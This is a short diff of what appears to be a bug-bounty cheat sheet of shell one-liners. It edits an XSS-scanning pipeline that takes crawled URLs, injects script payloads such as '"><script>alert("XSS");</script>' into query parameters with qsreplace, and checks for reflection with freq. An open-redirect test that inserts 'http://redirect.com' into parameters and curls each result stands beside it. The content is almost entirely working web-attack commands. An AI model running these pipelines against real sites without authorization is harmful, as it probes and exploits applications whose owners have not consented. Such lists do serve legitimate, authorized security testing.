@@ -27,4 +27,5 @@ cat katana.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | tee combin
 cat katana.txt | grep -a -i \=http | bhedak 'http://redirect.com' | while read host; do curl -s -L "$host" -I | grep "redirect.com" && echo -e "$host {Vulnerable}"; done
 
 # XSS with uro and freq
-cat katana.txt | grep "=" | egrep -iv "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+cat urls.txt | grep "=" | egrep -iv "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><script>alert("XSS");</script>' | freq
+
